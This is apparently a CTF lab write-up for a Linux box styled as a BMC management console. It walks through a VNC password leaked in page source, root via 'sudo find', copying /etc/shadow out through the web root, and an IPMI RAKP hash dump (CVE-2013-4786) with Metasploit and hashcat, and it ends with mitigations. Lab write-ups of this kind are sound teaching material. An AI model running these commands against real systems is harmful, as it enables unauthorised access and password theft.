---
title: "Lab-Doge: Lights Out"
date: 2026-05-28 10:00:00 -0500
categories: [CTF, Lab-Doge]
tags: [vnc, ipmi, bmc, cve-2013-4786, gtfobins, sudo, fail2ban, novnc, rakp, hashcat]
image:
  path: /assets/Images/ipmi-exploit.png
---

> **Lights Out** is an easy Linux box themed around a fake server **Lights-Out / BMC (iDRAC-style) management console**. The whole gimmick is hidden in plain sight: a "Virtual Console" that is really a **VNC** session, the password leaked in the web source, and a one-line `sudo` misconfiguration for root. There is also a fully working **IPMI RAKP hash-dump (CVE-2013-4786)** path that bypasses the box's `fail2ban` entirely.
{: .prompt-info }

> **fail2ban warning.** This box runs `fail2ban` with a low retry threshold. Hammering SSH (or VNC) with bad auth gets your VPN IP **dropped** mid-engagement. Plan your auth attempts; don't spray. (I learned this the hard way — see the dead-ends section.)
{: .prompt-danger }

---

## Recon

```bash
nmap -sC -sV -oN quick.nmap 192.168.5.15
nmap -p- -sV -T4 -oN full.nmap 192.168.5.15
```

| Port | Service | Detail |
|------|---------|--------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu — **fail2ban guarded** |
| 80/tcp | HTTP | Caddy — *"Lights Out Manager 9"* (static BMC-themed UI) |
| 5900/tcp | VNC | RFB protocol 3.8 |
| 6080/tcp | websockify | noVNC backend (proxied by `/novnc` on :80) |
| 623/udp | IPMI/RMCP | **UP** (ASF presence pong) — the theme is real |

Two parallel ways in: the **web→VNC** path (intended) and the **IPMI RAKP** path (CVE-2013-4786). Both are documented below.

---

## The web is a decoy (with one real secret)

Port 80 serves a polished iDRAC/BMC clone (`BELLTECH · LOM9 Enterprise · ServeEdge B740`). The "login" form is fake — it's just `method=get action=/dashboard.html`, no server-side auth, and Caddy returns `200` for every path (SPA fallback), so directory brute-forcing is pure noise.

The real secret lives in the **Virtual Console** page. The noVNC "launch" link auto-connects with the VNC password embedded right in the query string:

```bash
curl -s http://192.168.5.15/console.html | grep -oE '/novnc[^"]+'
# /novnc/vnc.html?autoconnect=true&resize=scale&path=websockify&password=45dqdmDCaENTH6
```

**VNC password: `45dqdmDCaENTH6`** (note: VNC truncates passwords to 8 bytes, so the effective key is `45dqdmDC`).

---

## Foothold — the VNC "virtual console" is a live shell

Connect over VNC (use a proper RFB 3.8 client / the noVNC page on :80 — see dead-ends for why a sloppy client locks you out):

```bash
# headless screenshot of the console
vncdo -s 192.168.5.15::5900 -p '45dqdmDCaENTH6' pause 3 capture console.png
```

The console drops straight into a logged-in shell as **`bmcuser@bmc-01`** — no OS login required. That's the foothold.

![VNC virtual console = logged-in bmcuser shell](/assets/Images/lightsout-vnc-console.png)

You can drive the shell with VNC keystrokes:

```bash
vncdo -s 192.168.5.15::5900 -p '45dqdmDCaENTH6' type "id; hostname" key enter pause 2 capture out.png
# uid=1001(bmcuser) gid=1001(bmcuser) ... bmc-01
```

---

## Privilege escalation — `sudo find` (GTFOBins)

```bash
sudo -n -l
# User bmcuser may run the following commands on bmc-01:
#     (root) NOPASSWD: /usr/bin/find
```

![sudo -l reveals NOPASSWD /usr/bin/find](/assets/Images/lightsout-sudo-find.png)

`find` on [GTFOBins](https://gtfobins.github.io/gtfobins/find/#sudo) gives instant root:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
# id -> uid=0(root)
```

You don't even need an interactive shell — `find`'s `-exec` is a root primitive on its own. For example, read any root-only file:

```bash
sudo /usr/bin/find /root/flag.txt -exec cat {} +
```

---

## The flag mechanic

`/root/flag.txt` doesn't contain a flag — it contains the rules:

![Root flag riddle](/assets/Images/lightsout-root-flag.png)

```
=== Lights Out Manager · Root Flag ===
Congrats — you escalated from the LOM tech console.
The flag is NOT in this file. The flag is the root account's cleartext password.
Capture /etc/shadow, crack the $6$ line offline (hashcat -m 1800),
and submit the cleartext pw to the Black Hash market to claim the lab-coin bounty.
```

So the flag = **root's cleartext password**. As root we read the hash. Trick: long hashes wrap/clip in a VNC screenshot, so write it into the Caddy web root and `curl` it back cleanly:

```bash
# (running as root via the find primitive)
grep '^root:' /etc/shadow > /var/www/idrac/h.txt
```

```bash
curl -s http://192.168.5.15/h.txt
# root:$6$rounds=656000$labbmc01$TL/Kubuee0DzMwsLyaHVxifAnL5GAXasVJvVwec9ttyl8l...KZt0:20590:0:99999:7:::
```


---

## Alternate path — IPMI RAKP hash dump (CVE-2013-4786)

The SEL log and the theme heavily hint at IPMI, and `623/udp` really is open. Confirm with a raw ASF presence ping (no tools/root needed):

```bash
python3 -c "import socket;p=bytes([0x06,0,0xff,6,0,0,0x11,0xbe,0x80,0,0,0]);s=socket.socket(2,2);s.settimeout(4);s.sendto(p,('192.168.5.15',623));print(s.recvfrom(1024)[0].hex())"
# 0600ff06000011be40000010...8100...  (0x40 = presence pong, 0x81 = IPMI)
```

IPMI 2.0's RAKP handshake leaks an HMAC of each user's password to **unauthenticated** clients — crackable offline, and it never touches `fail2ban`:

```bash
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS 192.168.5.15; set OUTPUT_HASHCAT_FILE ipmi.hashes; run; exit"
# strip the leading 'IP user:' so each line is salt:hash
sed 's/^[^ ]* [^:]*://' ipmi.hashes > ipmi.hc
hashcat -m 7300 ipmi.hc /usr/share/wordlists/rockyou.txt
```

Cracked BMC accounts:

| User | Password |
|------|----------|
| `admin` | `admin` |
| `root` | `calvin` *(the classic Dell iDRAC default)* |
| `ADMIN` | `ADMIN` |

These are **BMC/LOM** creds, not the OS root password (and they are **not** reused on SSH — tested). They flavour the box and are an alternate way to reason about it, but the VNC console is the cleaner foothold.

---

## Dead ends / lessons

- **fail2ban is real.** Two SSH reuse attempts (`operator`, `root`) plus a couple more and the box silently **DROP**ped my IP (port 22 timed out at the firewall). Confirm scope by testing a *different* port (80 stayed up). Burn auth attempts deliberately.
- **VNC self-lockout.** A sloppy client (`vncdotool` defaulting to RFB **3.3** + a wrong/truncated password) trips TigerVNC's *"Too many security failures"* after ~5 fails — a server-side lockout separate from fail2ban. Connect once, cleanly, via noVNC (:80 websockify) or a real RFB 3.8 client.
- **VNC keystroke injection is lossy.** Driving a shell through `vncdo type` drops characters on long commands and breaks on embedded double-quotes. Keep typed commands short, single-quoted only, and exfil long output by writing to the web root and `curl`-ing it.
- The local Elastic Agent `.ndjson` files (`/opt/Elastic/Agent`) are the agent's own **operational** logs — they do **not** contain endpoint process events / the password. Don't rabbit-hole there.

---

## Mitigations

- Never embed VNC/console passwords in client URLs or page source; require real authentication for the virtual console.
- Treat VNC as sensitive: strong unique password (remember the 8-byte truncation), TLS, and network restriction.
- Disable IPMI **Cipher Suite 0** and restrict `623/udp`; IPMI 2.0 RAKP hash disclosure (CVE-2013-4786) is unfixable at the protocol level — segment the management network.
- Scope `sudo` precisely: `NOPASSWD: /usr/bin/find` is equivalent to giving the user root (GTFOBins).
- Use high-`rounds` *and* a non-guessable password; KDF cost doesn't help if the password is in rockyou.

---

## Attack chain

```
HTTP :80 (BMC decoy)  ->  leak VNC password from /console.html noVNC link
        ->  VNC :5900 virtual console = logged-in bmcuser shell  (foothold)
        ->  sudo /usr/bin/find  (GTFOBins)  ->  root
        ->  read /etc/shadow -> crack $6$ (rounds=656000) -> root cleartext password (flag)

[alt] IPMI 623/udp -> CVE-2013-4786 RAKP dump -> crack admin/root/ADMIN BMC creds
```
